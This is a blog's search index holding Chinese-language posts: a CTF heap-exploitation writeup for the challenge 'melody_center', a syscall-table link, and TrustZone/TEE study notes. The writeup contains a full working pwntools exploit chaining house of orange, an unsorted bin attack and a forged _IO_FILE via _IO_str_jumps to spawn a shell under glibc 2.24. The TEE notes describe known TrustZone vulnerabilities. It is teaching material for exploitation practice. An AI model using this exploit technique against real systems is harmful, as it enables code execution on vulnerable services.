<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pwn rop: De-ASLR</title>
      <link href="/2020/02/17/pwn-rop-De-ASLR/"/>
      <url>/2020/02/17/pwn-rop-De-ASLR/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Input password</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="a4efd7689df4294ede5d3c816fd065a0fa2a2e1233c4fda9954397a36bcc572f"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux x86 和 x86_64 系统调用表</title>
      <link href="/2020/02/12/linux-x86-%E5%92%8C-x86-64-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/"/>
      <url>/2020/02/12/linux-x86-%E5%92%8C-x86-64-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><p><a href="https://syscalls32.paolostivanin.com/" target="_blank" rel="noopener">https://syscalls32.paolostivanin.com/</a></p><h3 id="x86-64"><a href="#x86-64" class="headerlink" title="x86_64"></a>x86_64</h3><p><a href="https://syscalls64.paolostivanin.com/" target="_blank" rel="noopener">https://syscalls64.paolostivanin.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> Reference </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn heap: melody_center</title>
      <link href="/2020/02/07/pwn-heap-melody-center/"/>
      <url>/2020/02/07/pwn-heap-melody-center/</url>
      
        <content type="html"><![CDATA[<p>第一次接触house of orange + unsorted bin attack + IO_FILE的堆题，大佬们秒的题我硬是做了两三天才搞出来，结果远程打通了反而本地没打通，本地的问题就先放一放以后再解决了。</p><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>保护全开，题目给了四个功能：</p><pre><code>1. Create                      2. Edit                        3. Show                        4. Exit</code></pre><p>其中Create功能中malloc了3个chunk，第二个chunk的大小是可控的，但不超过0x900，第三个chunk的前8个字节是可控的，为两个signed int型的整数，第一个chunk中存了另外两个chunk的地址，以及第一个堆块的地址存在全局变量中（这两个没什么作用）。该功能限制使用4次。</p><pre><code>           (chunk_1)+----+----+                    |    |0x31|          +----+----+(chunk_2)                    +----+----+          |    |size|              +-----|    |    |--------&gt; +----+----+              |     +----+----+          |    |    |              |     |    |    |          +----+----+              |     +----+----+          |    |    |              |                          +----+----+              |                          ...........              |                          +----+----+(chunk_3)              |                          |    |0x21|              |                          +----+----+              +------------------------&gt; |    |    |                                         +----+----+</code></pre><p><br>Edit功能可以修改chunk_2中的数据，由于size可以重新给定，这里存在一个堆溢出可以利用。该功能限制使用1次。<br><br>Show功能用来输出chunk_2中的数据。该功能限制使用2次。<br><br>Exit就是调用exit(0)（用不上）</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li><p>题目没有提供free函数，需要利用house of orange得到一个unsorted bin</p></li><li><p>由于题目提供的输入函数没有在字符串末尾补0，可以利用这一点leak出libc的基址（unsorted bin-&gt;bk)</p></li><li><p>需要使用_IO_FILE结构攻击，低版本下（glibc&lt;=2.23)是通过伪造vtable进行的。但是题目提供的glibc==2.24，添加了新的检查机制（vtable必须要满足在<code>__stop___IO_vtables</code>和<code>__start___libc_IO_vtables</code>之间），这里需要利用<code>_IO_str_jumps</code>结构体进行绕过，因为它不在检查范围之内。这里需要用到malloc_printerr调用链，最终执行的会是<code>_IO_str_overflow</code>。</p><pre><code>malloc_printerr-&gt; __libc_message—&gt;abort-&gt;flush-&gt;_IO_flush_all_lock-&gt;_IO_OVERFLOW</code></pre><p>但最终需要的是调用<code>_IO_str_finish</code>，利用<code>(((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base)</code>完成<code>system(&quot;/bin/sh&quot;)</code>。</p><pre><code class="C">_IO_str_finish (_IO_FILE *fp, int dummy){if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))  (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  //[fp+0xe8]fp-&gt;_IO_buf_base = NULL;_IO_default_finish (fp, 0);}</code></pre></li><li><p>通过unsorted bin attack，将<code>_IO_list_all</code>改为<code>main_arena+0x58</code>即main_arena中unsorted bin的位置，此时<code>_IO_list_all-&gt;_chain</code>将指向<code>main_arena+0x58+0x68</code>main_arena中size=0x60的small bin，这个small bin以及其中的内容可以通过Edit中的堆溢出利用得到。当unsorted bin因为unsorted bin attack被破坏时，再次遍历会出错，会调用malloc_printerr。</p></li><li><p>伪造的IO_FILE结构体即<code>_IO_list_all-&gt;_chain</code>指向的结构体需要满足：</p><ol><li><code>fp-&gt;_mode</code> = 0</li><li><code>fp-&gt;_IO_write_ptr</code> &lt; <code>fp-&gt;_IO_write_base</code></li><li><code>fp-&gt;_IO_read_ptr</code> = 0x61 , smallbin4 + 8 (smallbin size)</li><li><code>fp-&gt;_IO_read_base</code> = <code>_IO_list_all</code> -0x10 , smallbin-&gt;bk, unsorted bin attack （以上为绕过<code>_IO_flush_all_lockp</code>的条件）</li><li>vtable = <code>_IO_str_jumps</code> - 8 ，这样调用<code>_IO_overflow</code>时会调用到     <code>_IO_str_finish</code></li><li><code>fp-&gt;_flags</code>= 0</li><li><code>fp-&gt;_IO_buf_base</code> = <code>binsh_addr</code></li><li><code>fp+0xe8</code> = system_addr</li></ol></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">def create(size, content, _217, _108):    p.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;)    p.sendlineafter(&quot;Size of Heap: &quot;, str(size))    p.sendafter(&quot;Content: &quot;, content)    p.sendlineafter(&quot;217: &quot;, str(_217))    p.sendlineafter(&quot;108: &quot;, str(_108))def edit(size, content, _217, _108):    p.sendlineafter(&quot;Your choice:&quot;, &quot;2&quot;)    p.sendlineafter(&quot;Size of Heap: &quot;, str(size))    p.sendafter(&quot;Content: &quot;, content)    p.sendlineafter(&quot;217: &quot;, str(_217))    p.sendlineafter(&quot;108: &quot;, str(_108))def show():    p.sendlineafter(&quot;Your choice:&quot;, &quot;3&quot;)    return p.recvuntil(&quot;==========&quot;)def exit():    p.sendlineafter(&quot;Your choice:&quot;, &quot;4&quot;)def pack_file(_flags = 0,              _IO_read_ptr = 0,              _IO_read_end = 0,              _IO_read_base = 0,              _IO_write_base = 0,              _IO_write_ptr = 0,              _IO_write_end = 0,              _IO_buf_base = 0,              _IO_buf_end = 0,              _IO_save_base = 0,              _IO_backup_base = 0,              _IO_save_end = 0,              _IO_marker = 0,              _IO_chain = 0,              _fileno = 0,              _lock = 0,              _wide_data = 0,              _mode = 0):    file_struct = p32(_flags) + \                  p32(0) + \                  p64(_IO_read_ptr) + \                  p64(_IO_read_end) + \                  p64(_IO_read_base) + \                  p64(_IO_write_base) + \                  p64(_IO_write_ptr) + \                  p64(_IO_write_end) + \                  p64(_IO_buf_base) + \                  p64(_IO_buf_end) + \                  p64(_IO_save_base) + \                  p64(_IO_backup_base) + \                  p64(_IO_save_end) + \                  p64(_IO_marker) + \                  p64(_IO_chain) + \                  p32(_fileno)    file_struct = file_struct.ljust(0x88, &quot;\x00&quot;)    file_struct += p64(_lock)    file_struct = file_struct.ljust(0xa0, &quot;\x00&quot;)    file_struct += p64(_wide_data)    file_struct = file_struct.ljust(0xc0, &#39;\x00&#39;)    file_struct += p64(_mode)    file_struct = file_struct.ljust(0xd8, &quot;\x00&quot;)    return file_structdef pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, main_arena_addr, system_addr, binsh_addr):    payload = pack_file(_flags = 0,                        _IO_read_ptr = 0x61, #smallbin5file_size                        _IO_read_end = main_arena_addr,                        _IO_read_base = _IO_list_all_ptr - 0x10, # unsorted bin attack _IO_list_all_ptr,                        _IO_write_base = 0,                        _IO_write_ptr = 1,                        _IO_buf_base = binsh_addr,                        _mode = 0,                        )    payload += p64(_IO_str_jumps_addr - 8)    payload += p64(0) # paddding    payload += p64(system_addr)    return payloadmain_arena_offset = 0x3c1b00_IO_list_all_offset = 0x3c2500_IO_str_jumps_offset = 0x3be4c0system_offset = 0x456a0str_bin_sh_offset = 0x18ac40# old top chunk ==&gt; unsorted bincreate(0x8d8, &quot;A&quot; * 8 + &quot;\n&quot;, 217, 108)edit(0x900, &quot;A&quot; * 0x8d8 + p64(0x21) + &quot;A&quot; * 0x18 + p64(0x6d1), 217, 108)create(0x900, &quot;B&quot; * 8 + &quot;\n&quot;, 217, 108)# leak main_arena and then leak libccreate(8, &quot;B&quot; * 8, 217, 108)res = show()main_arena = u64(res[0x18:0x1e].ljust(8, &#39;\x00&#39;))libc_base = main_arena - 0x58 - main_arena_offset_IO_list_all = libc_base + _IO_list_all_offset_IO_str_jumps = libc_base + _IO_str_jumps_offsetsystem = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offset# use unsorted bin attack to make _IO_list_all = main_arena + 0x58# thus _IO_list_all-&gt;_chains = main_arena + 0x58 + 0x68 ==&gt; small bin[5] (size = 0x60)# fake a _IO_FILE struct in small bin[4] by writing the unsorted bin# make use of _IO_str_jumps-&gt;_IO_str_finishpayload = &quot;E&quot; * 0x30 payload += pack_file_flush_str_jumps(_IO_str_jumps, _IO_list_all, main_arena, system, str_bin_sh)edit(0x300, payload + &quot;\n&quot; , 217, 108)#create(0x100, &quot;D&quot; * 7 + &quot;\n&quot;, 217, 108)success(&quot;main_arena: &quot; + hex(main_arena))success(&quot;libc_base: &quot; + hex(libc_base))success(&quot;_IO_list_all: &quot; + hex(_IO_list_all))success(&quot;_IO_str_jumps: &quot; + hex(_IO_str_jumps))success(&quot;system: &quot; + hex(system))success(&quot;str_bin_sh: &quot; + hex(str_bin_sh))p.interactive()</code></pre><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol><li>在触发malloc_printerr之后，size=0x60的unsorted bin是怎么进入到small bin的机制还不是很清楚</li><li>除了利用<code>_IO_str_finish</code>之外，还可以利用<code>_IO_str_overflow</code>，不过好像稍微复杂一点，没有尝试</li><li>glibc==2.24的情况下利用IO_FILE结构体攻击的方法不限于此种，还有其他利用方法没有尝试</li></ol><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>学习了其他大佬们的文章以及<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24-zh/" target="_blank" rel="noopener">CTF wiki</a></p><ol><li><a href="https://xz.aliyun.com/t/5579" target="_blank" rel="noopener">https://xz.aliyun.com/t/5579</a></li><li><a href="https://www.jianshu.com/p/1e45b785efc1" target="_blank" rel="noopener">https://www.jianshu.com/p/1e45b785efc1</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于TEE的一些预备知识</title>
      <link href="/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/"/>
      <url>/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h3 id="常见缩略词："><a href="#常见缩略词：" class="headerlink" title="常见缩略词："></a>常见缩略词：</h3><ul><li><b>REE</b>: Rich Execution Environment</li><li><b>TEE</b>: Trusted Execution Environment</li><li><b>OP-TEE</b>: Open Portable Trusted Execution Environment</li><li><b>SoC</b>: System on Chip</li><li><b>RPK</b>: Real-Time Kernel Protection</li><li><b>PKM</b>: Periodic Kernel Measurement</li><li><b>SMC</b>: Secure Monitor Call</li><li><b>SCM</b>: Secure Channel Manager</li><li><b>ATF</b>: ARM-Trusted-Firmware </li><li><b>OTA</b>: Over-The-Air</li><li><b>FIQ</b>: Fast Interrupt Request (Internal)</li><li><b>IRQ</b>: Interrupt Request (External)</li><li><b>TZASC</b>: TrustZone Address Space Controller</li><li><b>TZPC</b>: TrustZone Protection Controller</li><li><b>TZMA</b>: TrustZone Memory Adapter</li><li><b>TCB</b>: Trusted Computing Base</li><li><b>HIEE</b>: Hardware-assisted Isolated Execution Environments</li></ul><h3 id="不同架构下或不同应用中的TEE-Real-Product"><a href="#不同架构下或不同应用中的TEE-Real-Product" class="headerlink" title="不同架构下或不同应用中的TEE (Real Product)"></a>不同架构下或不同应用中的TEE (Real Product)</h3><ul><li>TPM (Trusted Platform Module)</li><li></li><li>ARM TrustZone</li><li>ARM SCP (System Co Processor)</li><li>Intel SMM (System Management Mode)</li><li>Intel TXT (Trusted Execution Technology)</li><li>Intel SGX (Software Guarded Extension)</li><li>Intel ME (Management Engine)</li><li>AMD PSP (Platform Security Processor)</li><li></li><li>Google Titan</li><li>MS Azure Pluton</li><li>Apple Secure Enclave</li><li>Apple T2</li></ul><h3 id="ARM-TrustZone-Exception-Levels"><a href="#ARM-TrustZone-Exception-Levels" class="headerlink" title="ARM TrustZone Exception Levels"></a>ARM TrustZone Exception Levels</h3><p><img src="/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/ARM_TrustZone.png" alt="ARM TrustZone Exception Levels"></p><h3 id="TrustZone-attack-surface"><a href="#TrustZone-attack-surface" class="headerlink" title="TrustZone attack surface"></a>TrustZone attack surface</h3><ul><li>The handler of messages addressed directly to the monitor.<blockquote><p>函数<code>tzbsp_es_is_activated</code>存在漏洞，允许在任意指定地址（包括TrustZone monitor和 kernel）写入一个0（DWORD），可实现在EL3中执行任意代码。</p></blockquote></li><li>Third-party applications (trustlets) running in TrustZone.<blockquote><p>由<code>tz_otp</code>提供的<code>otp_resync_account</code>函数中存在<code>BLE</code>指令（有符号比较），导致传入负数参数时，分支指令总会跳转到包含<code>memcpy</code>函数的特定分支中，并且该<code>memcpy</code>函数的<code>length</code>和<code>src</code>参数都由攻击者提供，因此可以导致栈溢出漏洞，从而实现在Secure World EL0的情况下实现任意代码执行。</p></blockquote></li><li>The Secure Boot component, which may allow code execution before the loading of the TrustZone and thus the ability to subvert the TrustZone itself.</li></ul><h3 id="Syscall-calls-as-data-for-fuzzing"><a href="#Syscall-calls-as-data-for-fuzzing" class="headerlink" title="Syscall calls as data(for fuzzing)"></a>Syscall calls as data(for fuzzing)</h3><h4 id="参数类型："><a href="#参数类型：" class="headerlink" title="参数类型："></a>参数类型：</h4><pre><code class="C">typedef enum {    ARG_NONE,    ARG_VALUE_NULL,    ARG_VALUE_8,    ARG_VALUE_16,    ARG_VALUE_32,    ARG_VALUE_64,    ARG_BUFFER_ALLOC,    ARG_BUFFER_REF,    ARG_BUFFER_DEREF32,    ARG_BUFFER_DEREF64,    ARG_DATA_SHARED,    ARG_DATA_PRIVATE,    ARG_RETURN_VALUE,    ARG_TYPE_MAX} svc_arg_type_t;</code></pre><h4 id="举例"><a href="#举例" class="headerlink" title="举例:"></a>举例:</h4><pre><code>00000000: 0100 0000 4a00 0000 1800 0001 1000 0000 ....J...........00000010: ff00 0000 0000 0000 0a48 656c 6c6f 204e .........Hello N00000020: 756c 6c63 6f6e 2100 ullcon!.</code></pre><blockquote><p>小端数据，如dead beef的值为0xefbeadde</p></blockquote><ul><li><code>0x0-0x3</code>bytes: syscall id == 0x00000001</li><li><code>0x4-0x7</code>bytes: arguments type == 0x0000004a(一个nibble代表一个参数，顺序从低到高)</li><li><code>0x8-0xB</code>bytes: arg1，buffer类型参数的偏移和长度，0x010 00018前3bits表示长度为0x10，后5bits表示偏移为0x18</li><li><code>0xC-0xF</code>bytes: arg2, _int32类型参数的值，0x00000010即值为0x10</li><li><code>0x10-0x17</code>bytes: 表示分隔，固定值</li><li><code>0x18-0x27</code>bytes: 对应字符串参数</li></ul><h4 id="再举例："><a href="#再举例：" class="headerlink" title="再举例："></a>再举例：</h4><p><img src="/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/syscall_data.png" alt="syscall data"></p>]]></content>
      
      
      <categories>
          
          <category> LearningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TrustZone </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
